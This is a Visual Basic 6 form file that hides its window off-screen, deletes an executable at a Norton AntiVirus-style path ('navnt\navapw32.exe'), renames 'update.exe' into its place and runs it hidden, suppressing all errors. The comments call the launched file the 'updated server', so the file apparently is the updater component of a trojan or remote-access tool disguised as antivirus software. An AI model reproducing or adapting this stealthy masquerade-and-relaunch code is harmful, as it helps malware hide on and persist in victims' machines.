VERSION 5.00
Begin VB.Form frmMain 
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   90
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   90
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   90
   ScaleWidth      =   90
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer3 
      Enabled         =   0   'False
      Interval        =   2000
      Left            =   -510
      Top             =   -150
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   5000
      Left            =   420
      Top             =   0
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   5000
      Left            =   0
      Top             =   0
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Sub Form_Load()
    On Error Resume Next
    frmMain.Hide
    frmMain.Top = -1000
    frmMain.Left = -1000
    Timer1.Enabled = True
End Sub

Private Sub Timer1_Timer()
    On Error Resume Next
    ' wait 5 seconds...delete the old file
    Kill "C:\Program Files\navnt\navapw32.exe"
    Name ("C:\Program Files\navnt\update.exe") As ("C:\Program Files\navnt\navapw32.exe")
    Timer1.Enabled = False
    Timer2.Enabled = True
End Sub

Private Sub Timer2_Timer()
    On Error Resume Next
    ' wait 5 more seconds... start the updated server
    AppActivate (Shell("C:\Program Files\navnt\navapw32.exe", vbHide)), False
    Timer3.Enabled = True
    Timer2.Enabled = False
End Sub

Private Sub Timer3_Timer()
    On Error Resume Next
    Unload Me
    End
End Sub
